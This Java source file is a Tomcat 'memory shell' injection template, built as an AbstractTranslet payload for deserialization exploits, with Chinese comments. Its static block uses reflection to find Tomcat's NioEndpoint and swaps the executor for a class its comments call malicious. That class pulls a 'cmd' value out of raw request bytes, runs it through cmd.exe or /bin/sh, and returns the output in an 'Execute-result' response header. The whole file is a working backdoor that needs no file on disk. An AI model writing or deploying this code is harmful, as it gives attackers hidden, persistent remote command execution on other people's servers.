package net.roboterh.injector.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.coyote.Response;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.NioEndpoint;
import org.apache.tomcat.util.threads.ThreadPoolExecutor;

import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.RejectedExecutionHandler;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.TimeUnit;

public class TomcatExecutor extends AbstractTranslet {
    static {
        // 从线程中获取NioEndpoint类
        NioEndpoint nioEndpoint = (NioEndpoint) getNioEndpoint();
        // 获取executor属性
        ThreadPoolExecutor executor = (ThreadPoolExecutor) getField(nioEndpoint, "executor");
        // 实例化我们的恶意executor类
        executorEvil evil = new executorEvil(executor.getCorePoolSize(), executor.getMaximumPoolSize(), executor.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, executor.getQueue(), executor.getThreadFactory(), executor.getRejectedExecutionHandler());
        // 将恶意类传入
        nioEndpoint.setExecutor(evil);
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public static Object getField(Object obj, String field) {
        // 递归获取类的及其父类的属性
        Class clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field declaredField = clazz.getDeclaredField(field);
                declaredField.setAccessible(true);
                return declaredField.get(obj);
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
        return null;
    }

    public static Object getNioEndpoint() {
        // 获取当前线程的所有线程
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            try {
                // 需要获取线程的特征包含Acceptor
                if (thread.getName().contains("Acceptor")) {
                    Object target = getField(thread, "target");
                    Object nioEndpoint = getField(target, "this$0");
                    return nioEndpoint;
                }
            } catch (Exception e) {
                e.printStackTrace();
                continue;
            }
        }
        // 没有获取到对应Endpoint，返回一个空对象
        return new Object();
    }

    static class executorEvil extends ThreadPoolExecutor {
        public executorEvil(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
        }
        public String getRequest() {
            try {
                // 通过调用getNioEndpoint方法获取到NioEndpoint对象
                Object nioEndpoint = getNioEndpoint();
                // 获取到stack数组
                Object[] objects = (Object[]) getField(getField(nioEndpoint, "nioChannels"), "stack");
                // 获取到Buffer
                ByteBuffer heapByteBuffer = (ByteBuffer) getField(getField(objects[0], "appReadBufHandler"), "byteBuffer");
                String req = new String(heapByteBuffer.array(), "UTF-8");
                // 分割出command
                String cmd = req.substring(req.indexOf("cmd") + "cmd".length() + 1, req.indexOf("\r", req.indexOf("cmd")) - 1);
                return cmd;
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }
        // 获取命令执行返回的回显结果
        public void getResponse(byte[] res) {
            try {
                // 获取NioEndpoint对象
                Object nioEndpoint = getNioEndpoint();
                // 获取线程中的response对象
                ArrayList processors = (ArrayList) getField(getField(getField(nioEndpoint, "handler"), "global"), "processors");
                // 遍历获取response
                for (Object processor : processors) {
                    RequestInfo requestInfo = (RequestInfo) processor;
                    // 获取到封装在req的response
                    Response response = (Response) getField(getField(requestInfo, "req"), "response");
                    // 将执行的结果写入response中
                    response.addHeader("Execute-result", new String(res, "UTF-8"));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        public void execute(Runnable command) {
            // 获取command
            String cmd = getRequest();
            try {
                String[] cmds = System.getProperty("os.name").toLowerCase().contains("windows") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                byte[] result = new java.util.Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next().getBytes();
                getResponse(result);
            } catch (Exception e) {
                e.printStackTrace();
            }

            this.execute(command, 0L, TimeUnit.MILLISECONDS);
        }
    }

}
